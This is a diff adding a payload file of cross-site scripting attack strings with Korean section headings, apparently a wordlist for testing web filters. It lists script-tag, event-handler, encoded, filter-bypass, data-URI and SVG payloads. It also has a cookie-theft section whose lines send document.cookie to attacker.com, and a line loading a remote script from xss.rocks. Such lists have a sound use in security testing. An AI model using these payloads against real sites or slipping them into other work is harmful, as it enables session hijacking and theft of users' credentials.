@@ -1,0 +1,101 @@
+# XSS (Cross-Site Scripting) 페이로드
+# 다양한 XSS 공격 벡터 테스트
+
+# 기본 XSS
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<SCRIPT>alert('XSS')</SCRIPT>
+<ScRiPt>alert('XSS')</ScRiPt>
+
+# 이벤트 핸들러 기반
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<svg onload=alert('XSS')>
+<body onload=alert('XSS')>
+<div onmouseover=alert('XSS')>test</div>
+<input onfocus=alert('XSS') autofocus>
+<select onfocus=alert('XSS') autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<iframe onload=alert('XSS')></iframe>
+<video><source onerror="alert('XSS')">
+<audio src=x onerror=alert('XSS')>
+
+# HTML 엔티티 인코딩
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
+
+# JavaScript 인코딩
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
+<script>eval('\x61\x6c\x65\x72\x74(\x27XSS\x27)')</script>
+
+# 필터 우회 (대소문자 혼합)
+<ScRiPt>alert('XSS')</ScRiPt>
+<SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+
+# 필터 우회 (공백/탭/줄바꿈)
+<img src=x onerror=alert('XSS')>
+<img/src=x/onerror=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+<img
+src=x
+onerror=alert('XSS')>
+
+# 필터 우회 (태그 중첩)
+<<script>alert('XSS');//<</script>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+
+# 필터 우회 (인용부호 생략/변형)
+<img src=x onerror=alert('XSS')>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror='alert("XSS")'>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+
+# DOM 기반 XSS
+#javascript:alert('XSS')
+javascript:alert('XSS')
+javascript:alert(String.fromCharCode(88,83,83))
+javascript:alert(document.cookie)
+
+# 데이터 URI
+<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<img src="data:text/html,<script>alert('XSS')</script>">
+
+# Base64 인코딩
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>
+
+# SVG 기반
+<svg><script>alert('XSS')</script></svg>
+<svg><script>alert(String.fromCharCode(88,83,83))</script></svg>
+<svg onload=alert('XSS')>
+
+# HTML5 기반
+<details open ontoggle=alert('XSS')>
+<marquee onstart=alert('XSS')>
+<math><mi//xlink:href="data:x,<script>alert('XSS')</script>">
+
+# 필터 우회 (주석)
+<!--<script>alert('XSS')</script>-->
+<!--<img src=x onerror=alert('XSS')>-->
+
+# 필터 우회 (null bytes)
+<script>alert('XSS')</script>
+%00<script>alert('XSS')</script>
+
+# 쿠키 탈취 시뮬레이션
+<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+<img src=x onerror="this.src='http://attacker.com/steal?cookie='+document.cookie">
+<script>fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})</script>
+
+# 최신 브라우저 우회
+<svg/onload=alert('XSS')>
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
+
